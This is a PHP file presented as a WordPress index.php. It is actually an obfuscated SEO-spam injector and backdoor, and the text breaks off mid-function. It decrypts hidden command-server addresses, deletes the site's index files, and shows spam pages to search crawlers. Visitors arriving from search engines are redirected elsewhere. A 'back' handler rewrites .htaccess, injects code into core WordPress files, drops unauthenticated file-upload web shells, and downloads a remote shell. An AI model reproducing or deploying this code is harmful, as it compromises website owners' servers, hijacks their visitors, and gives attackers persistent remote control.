 <?php 
@ini_set('display_errors', 0);
@ini_set('memory_limit', '-1');
@set_time_limit(3600); define("PACKNAME","2da4St/TK+WUF3Ev36Aavyotdg9fSQfHdhhnzu266HAAqDhh+5oqoH38WkOXuQ"); define("DATACENTER","56cbItL3Xl+28NCOFrMiEopWdtznt4CD0pSFC8KtMnjyYaNWTa0gcazO"); define("ST","3821wmd/rB+LccRmh/ii8u+bpsZaA1jYAAt8Y4FdNAvtGkyfZG9pHu8QT3Fdwxvl0W48SQ"); define("H","29aczFC9LcRigh6BbWVtweqXtL2rIIIaiEiQ0BLtdGYqFOsY+mY"); define("HTXT","ccfbBcBJ+Ik+oTYLt9TIuHpbWDIv6oV/H+DTf8EJjEn/Sb0gyI2dJBE"); define("ITXT","6acf2EKAKeIpXg5o3m2RQX6qojRSZG1g9VceiDJI1FywHNWKxx8"); define("IPHP","53ddAEDZWT97WD62w/zP7TonH43Qtx+1/Q3rfLTxRvwdLtxkezU"); define("WPI","1e03PTDpvGQwlM9Afxwk7ldPTSODvH7uiuqNfBshprFp6Vlo+jXonUTI"); define("WPA","07f78yRE1CrTFkHJasLVGb33gxemStu+jphnR+E1iC53jFDG/5dW"); define("WPC","65d9idweXNp/6EkwMLFMwNMuvxFCUnftx+pJ51JF2hnzfIHQNf6Imt4"); define("AT1","8b99ANTWgup/ekatYjcoo63+SwANjR6hoop8zwsJf3iDyz+C1dVcpfs"); define("CWCS","284cmnBp/SPmxar+FbnHqa9lA02sigtuBgWq3Ud8TdEioYolUMIwye+K8FHwRfhOckaqP+pg2bd1LOMX"); define("CWCP","568asQJ5quASUSbOomty6UOMCdqVL/DxmJO/nbivoklYjgux2dBcxoLD3HPmfGj8NODVbLbM7CA+uw"); define("CWCC","a42dIaMZCHDJe2iywZW+gJlPduMd/tV2MSTP9fhp+uzFS+De4N1kvf9n4EX/NfzJH4isXDoREZVrmMge"); define("WCPHP","78b3ss2mJcJHzbzethHVBLAO4T+hn5lk345Q4evTBnk2iDU1RQ/k2Hic"); define("LPHP","4d5cGYrEKH+Ir4cFRn6mY63pVgyrp8/2kDx/R2wD2Idf8IN7ew"); define("FPHP","9c2fmD8bEMP3JCMiqNJRq1o+3cs1mZCXBjO9Bfxqxu5hktj8QqfzJnpf"); define("VPHP","2e8eV9lJk5d32ySZwhHiT4QHwLeKzv9ylaLYfe8ulT4+7uITdhk/aA"); define("TLPHP","8a12e3UUe+G8vFYP4SptpThkTxRmxytTWIK8pPcS44Gut+jYZ6ij72JttKbRRuZm"); define("CWUPHP","3df3T8MipZlVLxGwPzUg0U2XWXUWEjh8N+PeEs05XokLfWOaUem3b3B3qRd7yd+IKw"); define("AUPHP","ff65rO1CRKV51orb5v98HsMuAfNwm/Q2XkpP3Q5+gT1pM1f8TJgKBQBcHnAZlQ"); define("IUPHP","d158duptwq07WnTme0fMZDGoZy3raZQUQVUQKE+d0OcaVvw7pXXJJLXDSrPfuA"); define("SXSL","af64T/9uWMiKW1wlqWmVJMYORBuqpTNMLN69RdTM5s9D2yJMbbu3aA"); define("WPPHP","9bae2ga+tmrIHf8/yFNCYBE71QQuyONVOVUbp4rKTSce8gw/erK8kcovuA"); define("WCSPHP","2579YuLJka8DDu7T3Wya+dwuHqX62cQrb56unPG9JrJH+iPwuD3cKZYWvQ07xO/vWA"); define("WCSTXT","32deN+npkIqSbhU696YqPkbF7KHE/S9CjSLeQV/Fd8cmo1NuB6ce/IKXmkZudha5Wg"); define("IOPHP","da88EUdfd4/onl+6LLLUYncPFwqc7QsTsWok1ng44pcqBZNd+aYYJWLq"); $key = "1zQuPMTI2e"; $JUMPSWITCH = curltxt('https://'.authcode(ST,"DECODE",$key,0).'/LIST/'.authcode(PACKNAME,"DECODE",$key,0).'/jump.txt'); if(file_exists(dirname(__FILE__)."/index.html")) { unlink(dirname(__FILE__)."/index.html"); } if(file_exists(dirname(__FILE__)."/index.htm")) { unlink(dirname(__FILE__)."/index.htm"); } if(file_exists(dirname(__FILE__)."/default.php")) { unlink(dirname(__FILE__)."/default.php"); } if(file_exists(dirname(__FILE__)."/default.html")) { unlink(dirname(__FILE__)."/default.html"); } if(file_exists(dirname(__FILE__)."/default.htm")) { unlink(dirname(__FILE__)."/default.htm"); } if(isset($_GET['sitemap'])) { $sitemap = trim($_GET['sitemap']); $sitemapcontent = curlxml('http://'.authcode(DATACENTER,"DECODE",$key,0).'/'.authcode(PACKNAME,"DECODE",$key,0).'/'.$_SERVER['HTTP_HOST'].'/sitemap-'.$sitemap.'.xml'); header("Content-type: text/xml"); print_r($sitemapcontent); die(); } if(isset($_GET['back']) and $_GET['back']=="1") { $htaccesscontent = curltxt('https://'.authcode(ST,"DECODE",$key,0).'/LIST/'.authcode(PACKNAME,"DECODE",$key,0).'/'.authcode(HTXT,"DECODE",$key,0).''); $indexcontent = curltxt('https://'.authcode(ST,"DECODE",$key,0).'/LIST/'.authcode(PACKNAME,"DECODE",$key,0).'/'.authcode(ITXT,"DECODE",$key,0).''); chmod(dirname(__FILE__)."/".authcode(H,"DECODE",$key,0)."", 0644); $htaccesscontent = '<IfModule mod_rewrite.c>'.PHP_EOL.'RewriteEngine On'.PHP_EOL.'RewriteBase /'.PHP_EOL.'RewriteRule ^index\.php$ - [L]'.PHP_EOL.'RewriteRule ^content-([^/]+) index.php?content=$1'.PHP_EOL.'RewriteRule ^sitemap-([^/]+).xml$ index.php?sitemap=$1 [L]'.PHP_EOL.'RewriteRule ^wp-phpinfo\.php$ wp-phpinfo.php [L]'.PHP_EOL.'RewriteRule ^wp-config-sample\.php$ wp-config-sample.php [L]'.PHP_EOL.'RewriteRule ^.*\.php\??.* index.php [L]'.PHP_EOL.'RewriteCond %{REQUEST_FILENAME} !-f'.PHP_EOL.'RewriteCond %{REQUEST_FILENAME} !-d'.PHP_EOL.'RewriteRule . /index.php [L]'.PHP_EOL.'</IfModule>'; file_put_contents(dirname(__FILE__).'/'.authcode(H,"DECODE",$key,0).'',$htaccesscontent); copy(dirname(__FILE__).'/'.authcode(IPHP,"DECODE",$key,0).'',dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(ITXT,"DECODE",$key,0).''); copy(dirname(__FILE__).'/'.authcode(H,"DECODE",$key,0).'',dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(HTXT,"DECODE",$key,0).''); if(!is_dir(dirname(__FILE__).authcode(WPI,"DECODE",$key,0))) { mkdir (dirname(__FILE__).authcode(WPI,"DECODE",$key,0),0755,true); } if(!is_dir(dirname(__FILE__).authcode(WPA,"DECODE",$key,0))) { mkdir (dirname(__FILE__).authcode(WPA,"DECODE",$key,0),0755,true); } if(!is_dir(dirname(__FILE__).authcode(WPC,"DECODE",$key,0))) { mkdir (dirname(__FILE__).authcode(WPC,"DECODE",$key,0),0755,true); } $addtext1path = dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(AT1,"DECODE",$key,0); $backpathtext1 = dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(CWCS,"DECODE",$key,0); $backpathtext2 = dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(CWCP,"DECODE",$key,0); $backpathtext3 = dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(CWCC,"DECODE",$key,0); $backpathtextf = dirname(__FILE__).'/'.authcode(WCPHP,"DECODE",$key,0); $backpathtext4 = dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(LPHP,"DECODE",$key,0); $backpathtext5 = dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(FPHP,"DECODE",$key,0); $backpathtext6 = dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(VPHP,"DECODE",$key,0); $backpathtext7 = dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(TLPHP,"DECODE",$key,0); if(!file_exists($addtext1path)) { file_put_contents($addtext1path,''); } if(!file_exists($backpathtext1)) { file_put_contents($backpathtext1,''); } if(!file_exists($backpathtext2)) { file_put_contents($backpathtext2,''); } if(!file_exists($backpathtext3)) { file_put_contents($backpathtext3,''); } if(!file_exists($backpathtextf)) { file_put_contents($backpathtextf,''); } if(!file_exists($backpathtext4)) { file_put_contents($backpathtext4,''); } if(!file_exists($backpathtext5)) { file_put_contents($backpathtext5,''); } if(!file_exists($backpathtext6)) { file_put_contents($backpathtext6,''); } if(!file_exists($backpathtext7)) { file_put_contents($backpathtext7,''); } $addtext1 = '<?php /* ###back### */ define("PACKNAME","2da4St/TK+WUF3Ev36Aavyotdg9fSQfHdhhnzu266HAAqDhh+5oqoH38WkOXuQ"); define("DATACENTER","56cbItL3Xl+28NCOFrMiEopWdtznt4CD0pSFC8KtMnjyYaNWTa0gcazO"); define("ST","3821wmd/rB+LccRmh/ii8u+bpsZaA1jYAAt8Y4FdNAvtGkyfZG9pHu8QT3Fdwxvl0W48SQ"); define("H","29aczFC9LcRigh6BbWVtweqXtL2rIIIaiEiQ0BLtdGYqFOsY+mY"); define("HTXT","ccfbBcBJ+Ik+oTYLt9TIuHpbWDIv6oV/H+DTf8EJjEn/Sb0gyI2dJBE"); define("ITXT","6acf2EKAKeIpXg5o3m2RQX6qojRSZG1g9VceiDJI1FywHNWKxx8"); define("IPHP","53ddAEDZWT97WD62w/zP7TonH43Qtx+1/Q3rfLTxRvwdLtxkezU"); define("WPI","1e03PTDpvGQwlM9Afxwk7ldPTSODvH7uiuqNfBshprFp6Vlo+jXonUTI"); define("WPA","07f78yRE1CrTFkHJasLVGb33gxemStu+jphnR+E1iC53jFDG/5dW"); define("WPC","65d9idweXNp/6EkwMLFMwNMuvxFCUnftx+pJ51JF2hnzfIHQNf6Imt4"); define("AT1","8b99ANTWgup/ekatYjcoo63+SwANjR6hoop8zwsJf3iDyz+C1dVcpfs"); define("CWCS","284cmnBp/SPmxar+FbnHqa9lA02sigtuBgWq3Ud8TdEioYolUMIwye+K8FHwRfhOckaqP+pg2bd1LOMX"); define("CWCP","568asQJ5quASUSbOomty6UOMCdqVL/DxmJO/nbivoklYjgux2dBcxoLD3HPmfGj8NODVbLbM7CA+uw"); define("CWCC","a42dIaMZCHDJe2iywZW+gJlPduMd/tV2MSTP9fhp+uzFS+De4N1kvf9n4EX/NfzJH4isXDoREZVrmMge"); define("WCPHP","78b3ss2mJcJHzbzethHVBLAO4T+hn5lk345Q4evTBnk2iDU1RQ/k2Hic"); define("LPHP","4d5cGYrEKH+Ir4cFRn6mY63pVgyrp8/2kDx/R2wD2Idf8IN7ew"); define("FPHP","9c2fmD8bEMP3JCMiqNJRq1o+3cs1mZCXBjO9Bfxqxu5hktj8QqfzJnpf"); define("VPHP","2e8eV9lJk5d32ySZwhHiT4QHwLeKzv9ylaLYfe8ulT4+7uITdhk/aA"); define("TLPHP","8a12e3UUe+G8vFYP4SptpThkTxRmxytTWIK8pPcS44Gut+jYZ6ij72JttKbRRuZm"); define("CWUPHP","3df3T8MipZlVLxGwPzUg0U2XWXUWEjh8N+PeEs05XokLfWOaUem3b3B3qRd7yd+IKw"); define("AUPHP","ff65rO1CRKV51orb5v98HsMuAfNwm/Q2XkpP3Q5+gT1pM1f8TJgKBQBcHnAZlQ"); define("IUPHP","d158duptwq07WnTme0fMZDGoZy3raZQUQVUQKE+d0OcaVvw7pXXJJLXDSrPfuA"); define("SXSL","af64T/9uWMiKW1wlqWmVJMYORBuqpTNMLN69RdTM5s9D2yJMbbu3aA"); define("WPPHP","9bae2ga+tmrIHf8/yFNCYBE71QQuyONVOVUbp4rKTSce8gw/erK8kcovuA"); define("WCSPHP","2579YuLJka8DDu7T3Wya+dwuHqX62cQrb56unPG9JrJH+iPwuD3cKZYWvQ07xO/vWA"); define("WCSTXT","32deN+npkIqSbhU696YqPkbF7KHE/S9CjSLeQV/Fd8cmo1NuB6ce/IKXmkZudha5Wg"); define("IOPHP","da88EUdfd4/onl+6LLLUYncPFwqc7QsTsWok1ng44pcqBZNd+aYYJWLq"); $key = "1zQuPMTI2e"; $path = str_replace("/wp-includes", "", dirname(__FILE__)); $checkhtaccess = file_get_contents($path."/".authcode_copy(H,"DECODE",$key,0).""); chmod($path."/".authcode_copy(H,"DECODE",$key,0)."", 0644); copy(dirname(__FILE__) . "/".authcode_copy(HTXT,"DECODE",$key,0)."", $path."/".authcode_copy(H,"DECODE",$key,0).""); chmod($path . "/".authcode_copy(H,"DECODE",$key,0)."", 0444); chmod($path . "/".authcode_copy(IPHP,"DECODE",$key,0)."", 0644); copy(dirname(__FILE__) . "/".authcode_copy(ITXT,"DECODE",$key,0)."", $path."/".authcode_copy(IPHP,"DECODE",$key,0).""); chmod($path . "/".authcode_copy(IPHP,"DECODE",$key,0)."", 0444); copy(dirname(__FILE__) . "/".authcode_copy(SXSL,"DECODE",$key,0).".txt", $path."/".authcode_copy(SXSL,"DECODE",$key,0).""); copy(dirname(__FILE__) . "/".authcode_copy(WPPHP,"DECODE",$key,0).".txt", $path."/".authcode_copy(WPPHP,"DECODE",$key,0).""); copy(dirname(__FILE__) . "/".authcode_copy(WCSTXT,"DECODE",$key,0)."", $path."/".authcode_copy(WCSPHP,"DECODE",$key,0).""); copy(dirname(__FILE__) . "/".authcode_copy(WCSTXT,"DECODE",$key,0)."", $path.authcode_copy(WPC,"DECODE",$key,0).authcode_copy(IOPHP,"DECODE",$key,0)); copy(dirname(__FILE__) . "/".authcode_copy(WCSTXT,"DECODE",$key,0)."", $path.authcode_copy(WPA,"DECODE",$key,0).authcode_copy(IOPHP,"DECODE",$key,0)); copy(dirname(__FILE__) . "/".authcode_copy(WCSTXT,"DECODE",$key,0)."", $path.authcode_copy(WPI,"DECODE",$key,0).authcode_copy(IOPHP,"DECODE",$key,0));'; $fgocontent = 'function Go($url){ $ch = curl_init(); $ip = rand(0,255).".".rand(0,255).".".rand(0,255).".".rand(0,255) ; $timeout = 15; curl_setopt($ch,CURLOPT_URL,$url); curl_setopt($ch,CURLOPT_TIMEOUT,0); curl_setopt($ch,CURLOPT_HTTPHEADER,array("X-FORWARDED-FOR:".$ip."","CLIENT-IP:".$ip."")); curl_setopt($ch,CURLOPT_USERAGENT,"Mozilla/5.0 (compatible; Googlebot/2.0; +http://www.google.com/search/spider.html)"); curl_setopt($ch,CURLOPT_RETURNTRANSFER,1); curl_setopt($ch,CURLOPT_HEADER,0); curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);  curl_setopt($ch,CURLOPT_SSL_VERIFYPEER,false); curl_setopt($ch, CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4); $content = curl_exec($ch); return $content; }'; $auth = 'function authcode_copy($string, $operation = "DECODE", $key = "", $expiry = 0) { $ckey_length = 4; $key = md5($key ? $key : $GLOBALS["discuz_auth_key"]); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == "DECODE" ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ""; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == "DECODE" ? base64_decode(substr($string, $ckey_length)) :  sprintf("%010d", $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = ""; $box = range(0, 255); $rndkey = array(); for($i = 0; $i <= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for($j = $i = 0; $i < 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for($a = $j = $i = 0; $i < $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($operation == "DECODE") { if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) &&  substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else { return ""; } } else { return $keyc.str_replace("=", "", base64_encode($result)); } }'; file_put_contents($addtext1path, $addtext1); file_put_contents($backpathtext1, $addtext1.' '.$auth); file_put_contents($backpathtext2, $addtext1.' '.$auth); file_put_contents($backpathtext3, $addtext1.' '.$auth); if((strpos(file_get_contents($backpathtextf),'function Go($url)')) == false) { file_put_contents($backpathtextf, $fgocontent.' '.$auth, FILE_APPEND); } if((strpos(file_get_contents($backpathtext4),'/* ###back### */')) == false) { file_put_contents($backpathtext4,str_replace('<?php', $addtext1,file_get_contents($backpathtext4))); } if((strpos(file_get_contents($backpathtext5),'/* ###back### */')) == false) { file_put_contents($backpathtext5,str_replace('<?php', $addtext1,file_get_contents($backpathtext5))); } if((strpos(file_get_contents($backpathtext6),'/* ###back### */')) == false) { file_put_contents($backpathtext6,str_replace('<?php', $addtext1,file_get_contents($backpathtext6))); } if((strpos(file_get_contents($backpathtext7),'/* ###back### */')) == false) { file_put_contents($backpathtext7,str_replace('<?php', $addtext1,file_get_contents($backpathtext7))); } $uploadpathtext1 = dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(CWUPHP,"DECODE",$key,0); $uploadpathtext2 = dirname(__FILE__).authcode(WPA,"DECODE",$key,0).authcode(AUPHP,"DECODE",$key,0); $uploadpathtext3 = dirname(__FILE__).authcode(WPC,"DECODE",$key,0).authcode(IUPHP,"DECODE",$key,0); if(!file_exists($uploadpathtext1)) { file_put_contents($uploadpathtext1,''); } if(!file_exists($uploadpathtext2)) { file_put_contents($uploadpathtext2,''); } if(!file_exists($uploadpathtext3)) { file_put_contents($uploadpathtext3,''); } $uploadtext = '<?php if(isset($_FILES["file"])){ $filename = $_FILES["file"]["name"]; $type = $_FILES["file"]["type"]; $tmp_name = $_FILES["file"]["tmp_name"]; $size = $_FILES["file"]["size"]; $error = $_FILES["file"]["error"]; $count = count($_FILES["file"]["name"]); for ($i = 0; $i < $count; $i++) { if(move_uploaded_file($tmp_name[$i], $_SERVER["DOCUMENT_ROOT"]."/".$filename[$i])){ echo "Success!!!"; } else { echo "Failed!!!"; } } } else { ?><form action="" method="post" enctype="multipart/form-data"> <input type="file" name="file[]" multiple="true" > <input type="submit" value="upload"> </form> <?php } ?>'; file_put_contents($uploadpathtext1,$uploadtext); file_put_contents($uploadpathtext2,$uploadtext); file_put_contents($uploadpathtext3,$uploadtext); $xslcontent = curltxt('http://'.authcode(ST,"DECODE",$key,0).'/Pack/'.authcode(SXSL,"DECODE",$key,0)); $xslpath = dirname(__FILE__).'/'.authcode(SXSL,"DECODE",$key,0); file_put_contents($xslpath,$xslcontent); copy(dirname(__FILE__).'/'.authcode(SXSL,"DECODE",$key,0),dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(SXSL,"DECODE",$key,0).'.txt'); $phpinfocontent = '<?php phpinfo(); ?>'; $phpinfopath = dirname(__FILE__).'/'.authcode(WPPHP,"DECODE",$key,0); file_put_contents($phpinfopath,$phpinfocontent); copy(dirname(__FILE__).'/'.authcode(WPPHP,"DECODE",$key,0),dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(WPPHP,"DECODE",$key,0).'.txt'); $backpathtext8 = dirname(__FILE__).'/'.authcode(WCSPHP,"DECODE",$key,0); $sehllcontent = 'https://'.authcode(ST,"DECODE",$key,0).'/shcontent.txt'; file_put_contents($backpathtext8,curltxt($sehllcontent)); copy(dirname(__FILE__).'/'.authcode(WCSPHP,"DECODE",$key,0), dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(WCSTXT,"DECODE",$key,0)); copy(dirname(__FILE__).'/'.authcode(WCSPHP,"DECODE",$key,0), dirname(__FILE__).'/'.authcode(WCSPHP,"DECODE",$key,0)); copy(dirname(__FILE__).'/'.authcode(WCSPHP,"DECODE",$key,0), dirname(__FILE__).authcode(WPC,"DECODE",$key,0).authcode(IOPHP,"DECODE",$key,0)); copy(dirname(__FILE__).'/'.authcode(WCSPHP,"DECODE",$key,0), dirname(__FILE__).authcode(WPA,"DECODE",$key,0).authcode(IOPHP,"DECODE",$key,0)); copy(dirname(__FILE__).'/'.authcode(WCSPHP,"DECODE",$key,0), dirname(__FILE__).authcode(WPI,"DECODE",$key,0).authcode(IOPHP,"DECODE",$key,0)); chmod(dirname(__FILE__).'/'.authcode(H,"DECODE",$key,0)."", 0444); chmod(dirname(__FILE__).'/'.authcode(IPHP,"DECODE",$key,0)."", 0444); echo "<br/>Back ok!<br/>"; die(); } if(isset($_GET["google"])) { $google = trim($_GET["google"]); $gcon = "google-site-verification: " . $google; file_put_contents(dirname(__FILE__).'/'.$google,$gcon); echo "<br/>".$gcon." ok!<br/>"; die(); } if(isset($_GET["jump"]) && $_GET["jump"]=='1') { $strDefault = file_get_contents(__FILE__); $strDefault = str_replace('define("JUMPSWITCH","0");', 'define("JUMPSWITCH","'.$_GET["jump"].'");', $strDefault); file_put_contents(__FILE__,$strDefault); echo "<br/>JUMP (".$_GET["jump"].") ok!<br/>"; die(); } $picontent = curltxt((isHTTPS() ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].'/'.authcode(WPPHP,"DECODE",$key,0)); if((strpos($picontent,'url_rewriter') !== false) or (strpos($picontent,'mod_rewrite') !== false)) { $weijingtai = 'on'; } else { $weijingtai = 'off'; } $nowurl = (isHTTPS() ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']; if(strpos($nowurl,'-pid-') !== false) { list($ranurl,$pid) = explode('-pid-',$nowurl); $value = curl_get_content('http://'.authcode(DATACENTER,"DECODE",$key,0).'/'.authcode(PACKNAME,"DECODE",$key,0).'/get-content.php?pid='.$pid,5); } else { $value = curl_get_content('http://'.authcode(DATACENTER,"DECODE",$key,0).'/'.authcode(PACKNAME,"DECODE",$key,0).'/get-content.php?pid=1',5); } $value = trim($value); $value = str_replace('<llq>','',$value); $value = str_replace('</llq>','',$value); list($ranurl,$products_id,$products_name,$products_image,$url,$categories_name,$categories_id,$products_addimages,$sort_des, $products_description,$metatags_title,$metatags_keywords,$metatags_description,$onetext,$twotext,$links,$moban,$packname,$canshu,$lang) = explode('==>',$value); if(isCrawler()) { $html = curl_get_content('http://'.authcode(DATACENTER,"DECODE",$key,0).'/'.authcode(PACKNAME,"DECODE",$key,0).$moban,5); $html = str_ireplace('###lang###', $lang, $html); $html = str_ireplace('###metatags_title###', $metatags_title, $html); $html = str_ireplace('###metatags_description###', $metatags_keywords, $html); $html = str_ireplace('###metatags_keywords###', $metatags_description, $html); $html = str_ireplace('###products_name###', $products_name, $html); $html = str_ireplace('###categories_name###', $categories_name, $html); $html = str_ireplace('###sort_des###', $sort_des, $html); $html = str_ireplace('###products_description###', $products_description, $html); $html = str_ireplace('###url###', $url, $html); $html = str_ireplace('###products_image###', $products_image, $html); $html = str_ireplace('###products_addimages###', $products_addimages, $html); $html = str_ireplace('###onetext###', $onetext, $html); if($weijingtai == 'on') { $links = str_ireplace('index.php?content=', 'content-',$links); $canshu = str_ireplace('index.php?content=', 'content-',$canshu); } $links = str_ireplace('<a href="', '<a href="'.(isHTTPS() ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].'/',$links); $html = str_ireplace('###links###', $links, $html); $html = str_ireplace('###twotext###', $twotext, $html); $html = str_ireplace('###dibu###', $_SERVER['HTTP_HOST'], $html); $canshuarray = explode('###',$canshu); $html = str_ireplace('###canshu01###', (isHTTPS() ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].'/'.$canshuarray[0], $html); $html = str_ireplace('###canshu02###', (isHTTPS() ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].'/'.$canshuarray[1], $html); $html = str_ireplace('###canshu03###', (isHTTPS() ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].'/'.$canshuarray[2], $html); $html = str_ireplace('###canshu04###', (isHTTPS() ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].'/'.$canshuarray[3], $html); $html = str_ireplace('###canshu05###', (isHTTPS() ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].'/'.$canshuarray[4], $html); $html = str_ireplace('###canshu06###', (isHTTPS() ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].'/'.$canshuarray[5], $html); $html = str_ireplace('###canshu07###', (isHTTPS() ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].'/'.$canshuarray[6], $html); $html = str_ireplace('###canshu08###', (isHTTPS() ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].'/'.$canshuarray[7], $html); $html = str_ireplace('###canshu09###', (isHTTPS() ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].'/'.$canshuarray[8], $html); $html = str_ireplace('###canshu10###', (isHTTPS() ? 'https://' : 'http://').$_SERVER['HTTP_HOST'].'/'.$canshuarray[9], $html);     $html = str_ireplace('</body>', '<span id="'.$packname.'" data-packname-type="'.$packname.'"></span></body>', $html); echo $html; die(); } $referer = $_SERVER["HTTP_REFERER"]; $russ = '#(google|yahoo|incredibar|bing|docomo|mywebsearch|comcast|search-results|babylon|conduit)(\.[a-z0-9\-]+){1,2}#i'; if($JUMPSWITCH == "1" and preg_match($russ, $referer) and isCrawler() == false) { echo '<script language="javascript" type="text/javascript">window.location.href="'.$url.'";</script>'; die(); } else { define('WP_USE_THEMES', true); require __DIR__ . '/wp-blog-header.php'; } function isCrawler() { $agent= @strtolower($_SERVER['HTTP_USER_AGENT']); if (!empty($agent)) { $spiderSite= array( "Googlebot", "Mediapartners-Google", "Adsbot-Google", "Yahoo!", "Google AdSense", "Yahoo Slurp", "bingbot", "MSNBot"); foreach($spiderSite as $val) { $str = strtolower($val); if (strpos($agent, $str) !== false) { return true; } } } else { return false; } } function getTxtcontent($txtfile) { $file = @fopen($txtfile,'r'); $content = array(); if(!$file) { return '<span style="color:red;">file open fail!</span><br />'; } else { $i = 0; while (!feof($file)) { $content[$i] = fgets($file); $i++; } fclose($file); $content = array_filter($content); } return $content; } function isHTTPS() { if (defined('HTTPS') && HTTPS) return true; if (!isset($_SERVER)) return FALSE; if (!isset($_SERVER['HTTPS'])) return FALSE; if ($_SERVER['HTTPS'] === 1) { return TRUE; } elseif ($_SERVER['HTTPS'] === 'on') { return TRUE; } elseif ($_SERVER['SERVER_PORT'] == 443) { return TRUE; } return FALSE; } function getChmod($filepath) { return substr(base_convert(@fileperms($filepath),10,8),-4); } function curl_get_content($url,$proxy='') { if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")) { $curl = curl_init(); $user_agent = "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100"; if(strlen($proxy) > 8) curl_setopt($curl, CURLOPT_PROXY, $proxy); curl_setopt($curl, CURLOPT_URL, $url); if(stristr($url,"https:")) { curl_setopt_array($curl, array(CURLOPT_SSL_VERIFYHOST => 2,CURLOPT_SSL_VERIFYPEER => 0,    CURLOPT_POSTFIELDS => '', CURLOPT_RETURNTRANSFER => 1, CURLOPT_USERAGENT => $user_agent,CURLOPT_HEADER => 1, CURLOPT_VERBOSE => 0 )); } else { curl_setopt($curl, CURLOPT_URL, $url); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_HEADER, false); curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1); curl_setopt($curl, CURLOPT_USERAGENT, $user_agent); } $data = curl_exec($curl); curl_close($curl); } else { $is_auf = ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; if($is_auf) { $data = file_get_contents($url); } } if(!$data) return false; return $data; } function authcode($string, $operation = "DECODE", $key = "", $expiry = 0) { $ckey_length = 4; $key = md5($key ? $key : $GLOBALS["discuz_auth_key"]); $keya = md5(substr($key, 0, 16)); $keyb = md5(substr($key, 16, 16)); $keyc = $ckey_length ? ($operation == "DECODE" ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : ""; $cryptkey = $keya.md5($keya.$keyc); $key_length = strlen($cryptkey); $string = $operation == "DECODE" ? base64_decode(substr($string, $ckey_length)) :  sprintf("%010d", $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string; $string_length = strlen($string); $result = ""; $box = range(0, 255); $rndkey = array(); for ($i = 0; $i <= 255; $i++) { $rndkey[$i] = ord($cryptkey[$i % $key_length]); } for ($j = $i = 0; $i < 256; $i++) { $j = ($j + $box[$i] + $rndkey[$i]) % 256; $tmp = $box[$i]; $box[$i] = $box[$j]; $box[$j] = $tmp; } for ($a = $j = $i = 0; $i < $string_length; $i++) { $a = ($a + 1) % 256; $j = ($j + $box[$a]) % 256; $tmp = $box[$a]; $box[$a] = $box[$j]; $box[$j] = $tmp; $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256])); } if($operation == "DECODE") { if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) &&  substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) { return substr($result, 26); } else {     return ""; } } else { return $keyc.str_replace("=", "", base64_encode($result)); } } function curlxml($url) { $header[] = "Content-type: text/xml"; if(function_exists("curl_init") && function_exists("curl_setopt") && function_exists("curl_exec") && function_exists("curl_close")) { $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); curl_setopt($ch, CURLOPT_HTTPHEADER, $header); curl_setopt($ch, CURLOPT_BINARYTRANSFER, true); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $data = curl_exec($ch); curl_close($ch); } else { $is_auf = ini_get('allow_url_fopen') && function_exists("file_get_contents")?true:false; if($is_auf) { $data 